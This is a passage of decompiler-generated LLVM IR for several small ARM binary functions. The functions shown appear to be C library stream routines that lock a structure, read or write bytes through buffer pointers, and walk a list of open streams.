.thread44:                                        ; preds = %dec_label_pc_e6d4
  store i32 %v2_e27c, i32* %r3.global-to-local, align 4
  %v2_e6e0 = inttoptr i32 %v2_e6f0 to i32*
  %v3_e6e0 = load i32, i32* %v2_e6e0, align 4
  %v2_e6e8.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_e6e8 = sub i32 %v2_e6e8.pre, %v2_e27c
  store i32 %v3_e6e8, i32* %r3.global-to-local, align 4
  %v5_e6ec = mul i32 %v3_e6e8, 4
  %v6_e6ec = add i32 %v5_e6ec, %v3_e6e0
  store i32 %v6_e6ec, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_e6d4
  %v1_e6e441 = load i32, i32* %r6.global-to-local, align 4
  %v2_e6e442 = add i32 %v1_e6e441, 1
  store i32 %v2_e6e442, i32* %r3.global-to-local, align 4
  %v3_e6f0 = inttoptr i32 %v2_e6f0 to i32*
  store i32 %v2_e6e442, i32* %v3_e6f0, align 4
  %v0_e6f4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_e6fc = phi i32 [ %v2_e6f0, %.thread44 ], [ %v0_e6f4.pre, %.thread46 ]
  %v1_e6f4 = add i32 %v1_e6fc, 28
  %v2_e6f4 = inttoptr i32 %v1_e6f4 to i32*
  %v3_e6f4 = load i32, i32* %v2_e6f4, align 4
  store i32 %v3_e6f4, i32* %r3.global-to-local, align 4
  %v1_e6f8 = add i32 %v3_e6f4, 2
  store i32 %v1_e6f8, i32* %r0.global-to-local, align 4
  %v0_e6fc = load i32, i32* %sb.global-to-local, align 4
  %v2_e6fc = add i32 %v1_e6fc, 24
  %v3_e6fc = inttoptr i32 %v2_e6fc to i32*
  store i32 %v0_e6fc, i32* %v3_e6fc, align 4
  br i1 %v2_e6d8, label %dec_label_pc_e70c, label %bb147

bb147:                                            ; preds = %bb146
  %v1_e700 = load i32, i32* @r2, align 4
  %v2_e700 = load i32, i32* %r7.global-to-local, align 4
  %v3_e700 = inttoptr i32 %v2_e700 to i32*
  store i32 %v1_e700, i32* %v3_e700, align 4
  br label %dec_label_pc_e70c

dec_label_pc_e708:                                ; preds = %dec_label_pc_e2c4, %dec_label_pc_e3d0, %dec_label_pc_e480, %dec_label_pc_e454, %dec_label_pc_e460, %dec_label_pc_e3a0, %dec_label_pc_e640, %dec_label_pc_e5ec, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e70c

dec_label_pc_e70c:                                ; preds = %bb147, %bb146, %dec_label_pc_e708
  %v2_e710 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_e710, i32* @r4, align 4
  store i32 %v6_e274, i32* @r5, align 4
  %v26_e710 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_e710

; uselistorder directives
  uselistorder i32 %v3_e6e8, { 1, 0 }
  uselistorder i32 %v1_e6a8, { 1, 2, 0 }
  uselistorder i32 %v0_e65c, { 1, 2, 0 }
  uselistorder i32 %v2_e638, { 1, 0 }
  uselistorder i32 %v1_e638, { 1, 0, 2 }
  uselistorder i32 %v0_e658, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_e59c, { 1, 2, 0 }
  uselistorder i32 %v3_e584, { 1, 0 }
  uselistorder i32 %v3_e57c, { 1, 0 }
  uselistorder i32 %v2_e55c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e544, { 0, 2, 3, 1 }
  uselistorder i32 %v1_e528, { 1, 0, 2 }
  uselistorder i32 %v3_e508, { 2, 1, 0 }
  uselistorder i32 %v1_e4cc, { 0, 2, 3, 1 }
  uselistorder i32 %v2_e4a0, { 1, 0 }
  uselistorder i32 %v5_e400, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e400, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_e3ac, { 1, 0 }
  uselistorder i32 %v0_e3c8, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_e390, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_e378, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_e364, { 1, 2, 0 }
  uselistorder i32 %v0_e3dc, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_e318, { 1, 0 }
  uselistorder i32 %v1_e2e8, { 0, 2, 1 }
  uselistorder i32 %v25_e274, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 3, 2, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 2, 17, 16, 3, 7, 4, 0, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 1, 18 }
  uselistorder i32* %r6.global-to-local, { 13, 14, 11, 9, 3, 5, 12, 6, 7, 8, 0, 1, 2, 15, 4, 10 }
  uselistorder i32* %r3.global-to-local, { 3, 0, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 5, 7, 6, 8, 9, 10, 11, 12, 13, 20, 19, 14, 22, 15, 16, 17, 23, 18, 24, 25, 1, 26, 27, 28, 21, 0 }
  uselistorder i32 ()* @function_e228, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_16ebc.375 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_16ecc.373 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_16ee8.367 to i32), { 2, 1, 3, 0 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_16ea8.365 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0 }
  uselistorder label %dec_label_pc_e70c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e708, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_e6d4, { 1, 0 }
  uselistorder label %dec_label_pc_e6a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e690, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e64c, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_e604, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e4b8, { 1, 0 }
  uselistorder label %dec_label_pc_e490, { 1, 0 }
  uselistorder label %dec_label_pc_e440, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_e3c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e3bc, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e31c, { 1, 0 }
  uselistorder label %dec_label_pc_e30c, { 1, 0 }
}

define i32 @function_e738(i8* %arg1) local_unnamed_addr {
dec_label_pc_e738:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e738 = load i32, i32* @r4, align 4
  store i32 %v3_e738, i32* %stack_var_-16, align 4
  %v2_e73c = add i32 %tmp, 52
  %v3_e73c = inttoptr i32 %v2_e73c to i32*
  %v4_e73c = load i32, i32* %v3_e73c, align 4
  store i32 %v4_e73c, i32* %r6.global-to-local, align 4
  %v2_e744 = ptrtoint i32* %stack_var_-32 to i32
  %v2_e748 = icmp eq i32 %v4_e73c, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %v2_e744, i32* @r0, align 4
  br i1 %v2_e748, label %dec_label_pc_e760, label %dec_label_pc_e77c

dec_label_pc_e760:                                ; preds = %dec_label_pc_e738
  %v1_e768 = call i32 @function_10d54()
  %v1_e778 = call i32 @function_10d4c()
  %v0_e77c.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_e784.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e77c

dec_label_pc_e77c:                                ; preds = %dec_label_pc_e738, %dec_label_pc_e760
  %v0_e784 = phi i32 [ %v4_e73c, %dec_label_pc_e738 ], [ %v0_e784.pre, %dec_label_pc_e760 ]
  %v0_e77c = phi i32 [ %tmp, %dec_label_pc_e738 ], [ %v0_e77c.pre, %dec_label_pc_e760 ]
  %v1_e77c = add i32 %v0_e77c, 1
  %v2_e77c = inttoptr i32 %v1_e77c to i8*
  %v3_e77c = load i8, i8* %v2_e77c, align 1
  %v4_e77c = zext i8 %v3_e77c to i32
  %v1_e780 = inttoptr i32 %v0_e77c to i8*
  %v2_e780 = load i8, i8* %v1_e780, align 1
  %v3_e780 = zext i8 %v2_e780 to i32
  %v2_e784 = icmp eq i32 %v0_e784, 0
  %v4_e790 = mul nuw nsw i32 %v4_e77c, 256
  %v5_e790 = or i32 %v3_e780, %v4_e790
  store i32 %v5_e790, i32* %r4.global-to-local, align 4
  br i1 %v2_e784, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e77c
  call void @__pseudo_branch(i32 68948)
  %v0_e7a0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e77c, %bb
  %v0_e7a0 = phi i32 [ %v5_e790, %dec_label_pc_e77c ], [ %v0_e7a0.pre, %bb ]
  %v1_e7a0 = and i32 %v0_e7a0, 4
  %v2_e7a8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e7a8, i32* @r4, align 4
  ret i32 %v1_e7a0

; uselistorder directives
  uselistorder i32 %v0_e77c, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_e77c, { 1, 0 }
}

define i32 @function_e7bc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e7bc:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e7bc = load i32, i32* @r4, align 4
  store i32 %v3_e7bc, i32* %stack_var_-24, align 4
  %v6_e7bc = load i32, i32* @r5, align 4
  %v9_e7bc = load i32, i32* @r6, align 4
  %v12_e7bc = load i32, i32* @r7, align 4
  %v1_e7c0 = add i32 %arg3, 52
  %v2_e7c0 = inttoptr i32 %v1_e7c0 to i32*
  %v3_e7c0 = load i32, i32* %v2_e7c0, align 4
  store i32 %v3_e7c0, i32* %r8.global-to-local, align 4
  %v2_e7c4 = ptrtoint i32* %stack_var_-40 to i32
  %v1_e7c8 = add i32 %arg3, 56
  store i32 %v1_e7c8, i32* @r5, align 4
  %v2_e7cc = icmp eq i32 %v3_e7c0, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_e7c4, i32* @r0, align 4
  br i1 %v2_e7cc, label %dec_label_pc_e7ec, label %dec_label_pc_e808

dec_label_pc_e7ec:                                ; preds = %dec_label_pc_e7bc
  %v1_e7f4 = call i32 @function_10d54()
  store i32 59400, i32* @lr, align 4
  %v1_e804 = call i32 @function_10d4c()
  %v0_e808.pre = load i32, i32* @r6, align 4
  %v0_e80c.pre = load i32, i32* @r4, align 4
  %v0_e810.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_e808

dec_label_pc_e808:                                ; preds = %dec_label_pc_e7bc, %dec_label_pc_e7ec
  %v0_e810 = phi i32 [ %arg1, %dec_label_pc_e7bc ], [ %v0_e810.pre, %dec_label_pc_e7ec ]
  %v0_e80c = phi i32 [ %arg3, %dec_label_pc_e7bc ], [ %v0_e80c.pre, %dec_label_pc_e7ec ]
  %v0_e808 = phi i32 [ %arg2, %dec_label_pc_e7bc ], [ %v0_e808.pre, %dec_label_pc_e7ec ]
  %v3_e814 = inttoptr i32 %v0_e810 to i8*
  %v4_e814 = call i32 @function_eccc(i8* %v3_e814, i32 %v0_e808, i32 %v0_e80c)
  %v0_e818 = load i32, i32* %r8.global-to-local, align 4
  %v2_e818 = icmp eq i32 %v0_e818, 0
  store i32 %v4_e814, i32* %r4.global-to-local, align 4
  br i1 %v2_e818, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e808
  store i32 59444, i32* @lr, align 4
  call void @__pseudo_branch(i32 68948)
  %v0_e834.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e808, %bb
  %v0_e834 = phi i32 [ %v4_e814, %dec_label_pc_e808 ], [ %v0_e834.pre, %bb ]
  %v2_e83c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_e83c, i32* @r4, align 4
  store i32 %v6_e7bc, i32* @r5, align 4
  store i32 %v9_e7bc, i32* @r6, align 4
  store i32 %v12_e7bc, i32* @r7, align 4
  ret i32 %v0_e834

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_e808, { 1, 0 }
}

define i32 @function_e850(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e850:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e850 = load i32, i32* @r4, align 4
  store i32 %v3_e850, i32* %stack_var_-16, align 4
  %v6_e850 = load i32, i32* @r5, align 4
  %v9_e850 = load i32, i32* @r6, align 4
  %v1_e854 = add i32 %arg2, 52
  %v2_e854 = inttoptr i32 %v1_e854 to i32*
  %v3_e854 = load i32, i32* %v2_e854, align 4
  %v1_e858 = add i32 %arg2, 56
  store i32 %v1_e858, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e85c = icmp eq i32 %v3_e854, 0
  %v2_e860 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* @r4, align 4
  store i32 %v1_e858, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v2_e85c, label %dec_label_pc_e89c, label %dec_label_pc_e874

dec_label_pc_e874:                                ; preds = %dec_label_pc_e850
  %v1_e874 = add i32 %arg2, 16
  %v2_e874 = inttoptr i32 %v1_e874 to i32*
  %v3_e874 = load i32, i32* %v2_e874, align 4
  store i32 %v3_e874, i32* %r2.global-to-local, align 4
  %v1_e878 = add i32 %arg2, 28
  %v2_e878 = inttoptr i32 %v1_e878 to i32*
  %v3_e878 = load i32, i32* %v2_e878, align 4
  %v3_e87c = icmp uge i32 %v3_e874, %v3_e878
  store i1 %v3_e87c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_e87c, label %dec_label_pc_e890, label %bb

bb:                                               ; preds = %dec_label_pc_e874
  %v5_e880 = inttoptr i32 %v3_e874 to i8*
  store i8 %arg1, i8* %v5_e880, align 1
  %v0_e884.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  %v3_e890.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_e884.pr, label %dec_label_pc_e890, label %.thread1

.thread1:                                         ; preds = %bb
  %v2_e884 = inttoptr i32 %v3_e890.pre to i8*
  %v3_e884 = load i8, i8* %v2_e884, align 1
  %v4_e884 = zext i8 %v3_e884 to i32
  store i32 %v4_e884, i32* %r5.global-to-local, align 4
  %v6_e884 = add i32 %v3_e890.pre, 1
  store i32 %v6_e884, i32* %r2.global-to-local, align 4
  store i32 %v6_e884, i32* %v2_e874, align 4
  br label %dec_label_pc_e900

dec_label_pc_e890:                                ; preds = %bb, %dec_label_pc_e874
  %v3_e890 = phi i32 [ %v3_e874, %dec_label_pc_e874 ], [ %v3_e890.pre, %bb ]
  %v5_e890 = call i32 @function_ed64(i8 %arg1, i32 %arg2, i32 %v3_e890)
  store i32 %v5_e890, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e900

dec_label_pc_e89c:                                ; preds = %dec_label_pc_e850
  store i32 %v2_e860, i32* @r0, align 4
  %v1_e8ac = call i32 @function_10d54()
  store i32 59584, i32* @lr, align 4
  %v1_e8bc = call i32 @function_10d4c()
  %v0_e8c0 = load i32, i32* @r4, align 4
  %v1_e8c0 = add i32 %v0_e8c0, 16
  %v2_e8c0 = inttoptr i32 %v1_e8c0 to i32*
  %v3_e8c0 = load i32, i32* %v2_e8c0, align 4
  store i32 %v3_e8c0, i32* %r2.global-to-local, align 4
  %v1_e8c4 = add i32 %v0_e8c0, 28
  %v2_e8c4 = inttoptr i32 %v1_e8c4 to i32*
  %v3_e8c4 = load i32, i32* %v2_e8c4, align 4
  %v3_e8c8 = icmp uge i32 %v3_e8c0, %v3_e8c4
  store i1 %v3_e8c8, i1* %cpsr_c.global-to-local, align 1
  %v0_e8d0 = load i32, i32* @r5, align 4
  %v1_e8d0 = trunc i32 %v0_e8d0 to i8
  br i1 %v3_e8c8, label %dec_label_pc_e8e4, label %bb12

bb12:                                             ; preds = %dec_label_pc_e89c
  %v4_e8d4 = inttoptr i32 %v3_e8c0 to i8*
  store i8 %v1_e8d0, i8* %v4_e8d4, align 1
  %v0_e8d8.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  %v3_e8e4.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_e8d8.pr, label %dec_label_pc_e8e4, label %.thread4

.thread4:                                         ; preds = %bb12
  %v2_e8d8 = inttoptr i32 %v3_e8e4.pre to i8*
  %v3_e8d8 = load i8, i8* %v2_e8d8, align 1
  %v4_e8d8 = zext i8 %v3_e8d8 to i32
  store i32 %v4_e8d8, i32* %r5.global-to-local, align 4
  %v6_e8d8 = add i32 %v3_e8e4.pre, 1
  store i32 %v6_e8d8, i32* %r2.global-to-local, align 4
  %v2_e8dc = load i32, i32* @r4, align 4
  %v3_e8dc = add i32 %v2_e8dc, 16
  %v4_e8dc = inttoptr i32 %v3_e8dc to i32*
  store i32 %v6_e8d8, i32* %v4_e8dc, align 4
  br label %dec_label_pc_e8ec

dec_label_pc_e8e4:                                ; preds = %bb12, %dec_label_pc_e89c
  %v3_e8e4 = phi i32 [ %v3_e8c0, %dec_label_pc_e89c ], [ %v3_e8e4.pre, %bb12 ]
  %v5_e8e4 = call i32 @function_ed64(i8 %v1_e8d0, i32 %v0_e8c0, i32 %v3_e8e4)
  store i32 %v5_e8e4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e8ec

dec_label_pc_e8ec:                                ; preds = %.thread4, %dec_label_pc_e8e4
  store i32 %v2_e860, i32* @r0, align 4
  store i32 59648, i32* @lr, align 4
  %v1_e8fc = call i32 @function_10d54()
  br label %dec_label_pc_e900

dec_label_pc_e900:                                ; preds = %.thread1, %dec_label_pc_e890, %dec_label_pc_e8ec
  %v0_e900 = load i32, i32* %r5.global-to-local, align 4
  %v2_e908 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e908, i32* @r4, align 4
  store i32 %v6_e850, i32* @r5, align 4
  store i32 %v9_e850, i32* @r6, align 4
  %sext = mul i32 %v0_e900, 16777216
  %v15_e908 = sdiv i32 %sext, 16777216
  ret i32 %v15_e908

; uselistorder directives
  uselistorder i32 %v3_e8e4.pre, { 0, 2, 1 }
  uselistorder i8 %v1_e8d0, { 1, 0 }
  uselistorder i32 %v3_e890.pre, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 5, 4 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e900, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e8ec, { 1, 0 }
}

define i32 @function_e91c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e91c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_e91c = load i32, i32* @r4, align 4
  store i32 %v3_e91c, i32* %stack_var_-20, align 4
  %v6_e91c = load i32, i32* @r5, align 4
  %v9_e91c = load i32, i32* @r6, align 4
  %v12_e91c = load i32, i32* @r7, align 4
  %v1_e920 = add i32 %arg2, 52
  %v2_e920 = inttoptr i32 %v1_e920 to i32*
  %v3_e920 = load i32, i32* %v2_e920, align 4
  store i32 %v3_e920, i32* @r7, align 4
  %v1_e924 = add i32 %arg2, 56
  store i32 %v1_e924, i32* @r5, align 4
  %v2_e928 = ptrtoint i32* %stack_var_-36 to i32
  %v2_e92c = icmp eq i32 %v3_e920, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_e928, i32* @r0, align 4
  br i1 %v2_e92c, label %dec_label_pc_e948, label %dec_label_pc_e964

dec_label_pc_e948:                                ; preds = %dec_label_pc_e91c
  %v1_e950 = call i32 @function_10d54()
  store i32 59748, i32* @lr, align 4
  %v1_e960 = call i32 @function_10d4c()
  %v0_e964.pre = load i32, i32* @r4, align 4
  %v0_e968.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e964

dec_label_pc_e964:                                ; preds = %dec_label_pc_e91c, %dec_label_pc_e948
  %v0_e968 = phi i32 [ %arg1, %dec_label_pc_e91c ], [ %v0_e968.pre, %dec_label_pc_e948 ]
  %v0_e964 = phi i32 [ %arg2, %dec_label_pc_e91c ], [ %v0_e964.pre, %dec_label_pc_e948 ]
  %v2_e96c = call i32 @function_ee68(i32 %v0_e968, i32 %v0_e964)
  %v0_e970 = load i32, i32* @r7, align 4
  %v2_e970 = icmp eq i32 %v0_e970, 0
  store i32 %v2_e96c, i32* %r4.global-to-local, align 4
  br i1 %v2_e970, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e964
  call void @__pseudo_branch(i32 68948)
  %v0_e98c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e964, %bb
  %v0_e98c = phi i32 [ %v2_e96c, %dec_label_pc_e964 ], [ %v0_e98c.pre, %bb ]
  %v2_e994 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_e994, i32* @r4, align 4
  store i32 %v6_e91c, i32* @r5, align 4
  store i32 %v9_e91c, i32* @r6, align 4
  store i32 %v12_e91c, i32* @r7, align 4
  ret i32 %v0_e98c

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_ee68, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_e964, { 1, 0 }
}

define i32 @function_e9a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_e9a8:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_e9ac = ptrtoint i32* %stack_var_-48 to i32
  %v2_e9b0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_e9b0, i32* @r0, align 4
  store i32 68948, i32* %r4.global-to-local, align 4
  %v1_e9c4 = call i32 @function_10d54()
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r5.global-to-local, align 4
  %v1_e9d4 = call i32 @function_10d4c()
  %v2_e9dc = load i32, i32* @global_var_20a6c.289, align 4
  %v7_e9e0 = icmp eq i32 %v2_e9dc, 1
  br i1 %v7_e9e0, label %dec_label_pc_e9e8, label %dec_label_pc_ea94

dec_label_pc_e9e8:                                ; preds = %dec_label_pc_e9a8
  %v2_e9ec = load i32, i32* @global_var_20a70.294, align 4
  %tmp19 = icmp slt i32 %v2_e9ec, 1
  br i1 %tmp19, label %dec_label_pc_ea94, label %dec_label_pc_e9f8

dec_label_pc_e9f8:                                ; preds = %dec_label_pc_e9e8
  store i32 %v2_e9ac, i32* @r0, align 4
  %v1_ea08 = call i32 @function_10d54()
  %v1_ea14 = call i32 @function_10d4c()
  %v2_ea1c = load i32, i32* bitcast (i32** @global_var_202d4.329 to i32*), align 4
  store i32 %v2_ea1c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_ea6c3 = icmp eq i32 %v2_ea1c, 0
  br i1 %v2_ea6c3, label %dec_label_pc_ea78, label %dec_label_pc_ea28

dec_label_pc_ea28:                                ; preds = %dec_label_pc_e9f8, %dec_label_pc_ea68
  %v1_ea40 = phi i32 [ %v0_ea68, %dec_label_pc_ea68 ], [ %v2_ea1c, %dec_label_pc_e9f8 ]
  %v1_ea28 = inttoptr i32 %v1_ea40 to i8*
  %v2_ea28 = load i8, i8* %v1_ea28, align 1
  %v3_ea28 = zext i8 %v2_ea28 to i32
  %v1_ea2c = add i32 %v1_ea40, 1
  %v2_ea2c = inttoptr i32 %v1_ea2c to i8*
  %v3_ea2c = load i8, i8* %v2_ea2c, align 1
  %v4_ea2c = zext i8 %v3_ea2c to i32
  %v4_ea30 = mul nuw nsw i32 %v4_ea2c, 256
  %v5_ea30 = or i32 %v4_ea30, %v3_ea28
  %v2_ea34 = and i32 %v5_ea30, 32816
  %v7_ea38 = icmp eq i32 %v2_ea34, 48
  %v1_ea3c = add i32 %v1_ea40, 32
  %v2_ea3c = inttoptr i32 %v1_ea3c to i32*
  %v3_ea3c = load i32, i32* %v2_ea3c, align 4
  store i32 %v3_ea3c, i32* %r5.global-to-local, align 4
  br i1 %v7_ea38, label %dec_label_pc_ea48, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_ea28
  store i32 %v1_ea40, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ea68

dec_label_pc_ea48:                                ; preds = %dec_label_pc_ea28
  %v0_ea48 = load i32, i32* %r6.global-to-local, align 4
  %v2_ea48 = icmp eq i32 %v0_ea48, 0
  br i1 %v2_ea48, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_ea48
  %v3_ea50 = add i32 %v0_ea48, 32
  %v4_ea50 = inttoptr i32 %v3_ea50 to i32*
  store i32 %v3_ea3c, i32* %v4_ea50, align 4
  %v0_ea58.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_ea48
  store i32 %v3_ea3c, i32* bitcast (i32** @global_var_202d4.329 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_ea58 = phi i32 [ %v0_ea58.pre, %.thread ], [ %v1_ea40, %.thread1 ]
  %v1_ea58 = add i32 %v0_ea58, 1
  %v2_ea58 = inttoptr i32 %v1_ea58 to i8*
  %v3_ea58 = load i8, i8* %v2_ea58, align 1
  %v1_ea5c = and i8 %v3_ea58, 32
  %v1_ea64 = icmp ne i8 %v1_ea5c, 0
  call void @__pseudo_cond_branch(i1 %v1_ea64, i32 ptrtoint (i32* @global_var_fdcc.291 to i32))
  %v0_ea68.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_ea68

dec_label_pc_ea68:                                ; preds = %.thread12, %bb
  %v0_ea68 = phi i32 [ %v0_ea68.pre, %bb ], [ %v3_ea3c, %.thread12 ]
  store i32 %v0_ea68, i32* %r4.global-to-local, align 4
  %v2_ea6c = icmp eq i32 %v0_ea68, 0
  br i1 %v2_ea6c, label %dec_label_pc_ea78, label %dec_label_pc_ea28

dec_label_pc_ea78:                                ; preds = %dec_label_pc_ea68, %dec_label_pc_e9f8
  store i32 %v2_e9ac, i32* @r0, align 4
  %v1_ea88 = call i32 @function_10d54()
  %v0_ea90 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ea90, i32* @global_var_20a70.294, align 4
  %v2_ea98.pre = load i32, i32* @global_var_20a6c.289, align 4
  br label %dec_label_pc_ea94

dec_label_pc_ea94:                                ; preds = %dec_label_pc_e9a8, %dec_label_pc_e9e8, %dec_label_pc_ea78
  %v2_ea98 = phi i32 [ %v2_e9dc, %dec_label_pc_e9a8 ], [ 1, %dec_label_pc_e9e8 ], [ %v2_ea98.pre, %dec_label_pc_ea78 ]
  %v1_ea9c = add i32 %v2_ea98, -1
  store i32 %v1_ea9c, i32* @global_var_20a6c.289, align 4
  store i32 %v2_e9b0, i32* @r0, align 4
  store i32 60088, i32* @lr, align 4
  %v1_eab4 = call i32 @function_10d54()
  ret i32 %v1_eab4

; uselistorder directives
  uselistorder i32 %v0_ea68, { 2, 1, 0 }
  uselistorder i32 %v3_ea3c, { 1, 0, 2, 3 }
